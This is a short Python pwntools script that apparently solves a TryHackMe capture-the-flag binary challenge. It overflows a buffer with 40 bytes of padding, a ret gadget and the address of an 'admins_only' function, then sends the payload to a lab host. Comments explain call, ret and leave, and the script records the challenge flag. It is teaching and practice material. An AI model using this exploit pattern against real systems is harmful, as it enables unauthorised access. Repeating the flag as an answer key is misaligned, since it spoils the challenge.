#!/usr/bin/env python3

from pwn import *

exe = './pwn103.pwn103'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#p=process()
p=remote('10.10.77.151',9003)
p.sendline(b'3')

padding = 40

ret = 0x0000000000401016

#payload = padding * b'A'
#payload += p64(ret)
#payload += p64(elf.symbols.admins_only)

payload = flat(
    asm('nop')*padding,
    ret,
    elf.functions.admins_only,
)

p.sendline(payload)
p.interactive()

# call --> push + jmp, ret = pop + jmp
#suppose inst call generel(), what this does is pushes the next inst after the call onto the stack(for a return address) then jmps to the address of general()
# leave = mov rsp,rbp(move rbp into rsp) + pop rbp
#flag : THM{w3lC0m3_4Dm1N}
